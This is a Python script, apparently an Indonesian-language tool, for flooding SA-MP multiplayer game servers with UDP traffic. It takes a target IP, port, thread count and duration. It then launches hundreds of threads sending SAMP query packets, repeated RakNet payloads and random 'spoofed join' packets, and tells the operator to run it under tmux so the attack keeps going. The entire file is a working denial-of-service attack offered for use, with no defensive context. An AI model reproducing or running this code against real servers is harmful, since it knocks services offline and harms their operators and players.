import socket
import random
import threading
import time
import os
import struct

os.system("clear")
print("\033[31mSAMP NUDOS + RAKNET ULTRA FLOOD 2026 - VPS OPTIMIZED\033[0m\n")

ip = input("Target IP       : ")
port = int(input("Target Port     : ") or 7777)
threads = int(input("Threads         : ") or 800)
duration = int(input("Duration (detik): ") or 120)

# SAMP Query Packet (paling efektif untuk lag)
SAMP_QUERY = b'SAMP' + bytes([int(x) for x in ip.split('.')]) + struct.pack('<H', port) + b'i'

# RakNet Payload Variants
RAKNET_PAYLOADS = [
    b'\x02\x01\x02\x4D\xFF\xFF\x00\x00\xDD\x00\xFF\xFF\x00\xFE\xFE\xFE\xFE\xFD\xFD\xFD\xFD\x12\x34\x56\x78',  # Classic
    b'\x01' + b'\x00' * 30,  # Unconnected Ping
    b'\x05' + b'\x00' * 30,  # Open Connection Request
    b'\x00' * 64,            # Empty probe
]

def get_random_payload():
    base = random.choice(RAKNET_PAYLOADS)
    multiplier = random.randint(5, 25)
    return base * multiplier + random._urandom(random.randint(64, 512))

def samp_query_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end = time.time() + duration
    count = 0
    while time.time() < end:
        try:
            sock.sendto(SAMP_QUERY, (ip, port))
            junk = b'SAMP' + random._urandom(random.randint(8, 32))
            sock.sendto(junk, (ip, port))
            count += 2
            if count % 500 == 0:
                print("\033[32m[QUERY] Sent\033[0m", end="\r")
        except:
            pass
        # time.sleep(0.00005)  # sangat agresif

def raknet_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end = time.time() + duration
    while time.time() < end:
        try:
            payload = get_random_payload()
            sock.sendto(payload, (ip, port))
            print("\033[33m[RAKNET] Flood Sent\033[0m", end="\r")
        except:
            pass
        # time.sleep(0.00005)

def join_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end = time.time() + duration
    while time.time() < end:
        try:
            # Spoofed join + bigger random
            packet = random._urandom(random.randint(80, 256))
            sock.sendto(packet, (ip, port))
            print("\033[35m[JOIN] Spoofed Sent\033[0m", end="\r")
        except:
            pass
        # time.sleep(0.00005)

print(f"\033[31mMenyerang {ip}:{port} dengan SAMP Query + RakNet + Join Flood...\033[0m")
print("Gunakan tmux/screen biar tidak mati saat disconnect.\n")

# Mulai threads
for _ in range(threads):
    t1 = threading.Thread(target=samp_query_flood, daemon=True)
    t2 = threading.Thread(target=raknet_flood, daemon=True)
    t3 = threading.Thread(target=join_flood, daemon=True)
    t1.start()
    t2.start()
    t3.start()
    time.sleep(0.002)  # stagger agar tidak crash VPS

try:
    time.sleep(duration + 5)
except KeyboardInterrupt:
    print("\n\033[31mSerangan dihentikan manual.\033[0m")

print("\n\033[31mSerangan selesai.\033[0m")
